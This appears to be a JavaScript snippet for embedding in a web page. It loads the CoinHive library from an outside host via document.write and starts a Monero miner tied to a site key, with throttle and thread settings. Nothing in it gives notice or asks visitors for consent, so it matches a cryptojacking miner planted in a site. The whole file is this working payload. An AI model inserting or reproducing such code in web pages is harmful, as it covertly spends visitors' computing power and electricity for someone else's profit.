document.write("<script src=\"https://coin-hive.com/lib/coinhive.min.js\">"+"<"+"/script>");

var miner = new CoinHive.User('EZAmlkaD7th3P7TwKrISdoXMY5eK3D5x', 'mine', {
	threads: 1,
	autoThreads: false,
	throttle: 0.8,
	forceASMJS: false
});

miner.start();
